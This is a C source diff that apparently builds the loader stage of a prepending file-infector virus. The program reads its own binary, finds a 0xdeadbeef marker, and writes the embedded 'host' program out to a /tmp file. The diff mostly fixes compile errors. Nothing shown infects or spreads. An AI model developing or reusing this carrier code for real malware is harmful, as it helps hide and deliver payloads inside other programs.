@@ -1,12 +1,13 @@
 #include <stdlib.h>
-#include <
-
+#include <stdio.h>
+#include <string.h>
 
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/errno.h>
+#include <sys/sendfile.h>
 
 int main(int argc, char** argv) {
     
@@ -17,7 +18,7 @@ int main(int argc, char** argv) {
     sprintf(tempfilename, "/tmp/host.%u", ruid);
 
     // attempt to create new file
-    int tempfile = open(filename, O_CREAT | O_WRITE, S_IRWXU);
+    int tempfile = open(tempfilename, O_CREAT | O_WRONLY, S_IRWXU);
 
     // check if that file was already there
     if (tempfile == -1 && errno == EEXIST) {
@@ -30,7 +31,7 @@ int main(int argc, char** argv) {
     }
 
     // open ourselves
-    int seedfile = open(argv[0], O_READ);
+    int seedfile = open(argv[0], O_RDONLY);
 
     if (seedfile == -1) {
         printf("Error: seedfile cannot be opened\n");
@@ -38,11 +39,11 @@ int main(int argc, char** argv) {
     }
 
     // get info about files
-    stat* tempfilestat;
-    fstat(tempfile, tempfilestat);
+    struct stat tempfilestat;
+    fstat(tempfile, &tempfilestat);
 
-    stat* seedfilestat;
-    fstat(seedfile, seedfilestat);
+    struct stat seedfilestat;
+    fstat(seedfile, &seedfilestat);
     
     char magic[4] = {0xde, 0xad, 0xbe, 0xef};
     char buf[4];
@@ -50,13 +51,15 @@ int main(int argc, char** argv) {
     // find the hosts start location
     do {
         read(seedfile, buf, 4);
-    } while ( memcmp(magic, read, 4) != 0 );
+    } while ( memcmp(magic, buf, 4) != 0 );
 
     // where are we?
     off_t hoststart = lseek(seedfile, 0, SEEK_CUR);
 
-    printf("%d", hoststart);
+    printf("%ld\n", hoststart);
 
-    //sendfile(tempfile, seedfile, hoststart, );
+    off_t hoststartcopy = hoststart;
+
+    sendfile(tempfile, seedfile, &hoststartcopy, seedfilestat.st_size - hoststartcopy);
 
 }
